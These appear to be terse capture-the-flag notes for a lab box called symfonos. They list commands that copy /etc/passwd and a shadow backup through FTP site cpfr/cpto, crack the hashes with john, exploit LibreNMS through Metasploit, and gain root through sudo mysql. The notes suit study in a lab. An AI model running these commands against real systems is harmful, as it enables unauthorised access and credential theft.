Thursday 17 December 2020 10:54:30 PM 

Enumeration:
	Port Scan:
		sudo nmap -sC -sV -oA scans 10.0.2.19
	For SAMBA share:
		smbmap -u guest -H 10.0.2.19
		smbclient -U guest -N \\\\10.0.2.19\anonymous
		smbclient -U guest -N \\\\10.0.2.19\anonymous -c 'lcd /home/kali/Desktop/symfonos; get backups/log.txt'
	
For FTP:
	ftp 10.0.2.19
		use the password anonymous
		in the console type, site cpfr /etc/passwd
							cpto /home/aeolus/share/passwd
							cpfr /var/backups/shadow.bak
							cpto /home/aelous/share/shadow.bak
	
To crack the password:
	unshadow passwd shadow > unshadow.txt
	john unshadow.txt
	john -show unshadow.txt
		
For ssh login:
	for some reason, the standard ssh command did not work
	use msfconsole and auxiliary ssh login 
		sessions -u 1
		sessions 2
	netstat... noticed 8080 listening on localhost
		portfwd add -l 1234 -p 8080 -r 127.0.0.1
		Now, in the host machine access localhost:1234 on the browser
		
LibreNMS: use msfconsole to exploit librenms
		once you get the shell type: python -c 'import pty;pty.spawn("/bin/bash")'
		once a shell is spawned type 'sudo -l'
		/usr/bin/mysql can be used as sudo
		
		run mysql by typing 'sudo /usr/bin/mysql'
		within mysql, to execute system commands use 'system [command]' or you can use '\! bash' in the prompt
		=> 'system cat /root/proof.txt'
		

Final Thoughts:
	Look up the commands cpto and cpfr
	Read more about port forwarding and portfwd command
